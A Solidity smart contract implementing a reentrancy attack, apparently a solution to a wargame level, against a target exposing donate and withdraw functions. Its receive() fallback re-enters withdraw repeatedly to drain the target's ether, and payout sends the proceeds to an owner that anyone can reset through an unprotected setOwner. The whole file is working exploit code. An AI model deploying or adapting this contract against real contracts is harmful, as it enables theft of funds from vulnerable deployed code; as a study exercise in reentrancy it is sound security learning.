// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable; 
    function withdraw(uint256 _amount) external;
}

contract ReentrancyAttacker {
    address public owner;

    IReentrance targetContract;

    constructor(){
        owner = msg.sender;
    }

    
    function attack() external payable {
       require(msg.value > 0, "Must send ETH");
        // targetContract.donate{value: msg.value}(address(this));
        targetContract.withdraw(0.001 ether); // same amount
    }

    function donate() external payable {
        targetContract.donate{value: 0.001 ether}(address(this));
    }

    function setTarget(address _target) public{
        targetContract = IReentrance(_target);
    }

    function setOwner(address _newowner) public {
        owner = _newowner;
    }
    
    receive() external payable{
        if(address(targetContract).balance >= 0.001 ether){
            targetContract.withdraw(.001 ether);
        }
    }

    function payout() external {
        payable(owner).transfer(address(this).balance);
    }
}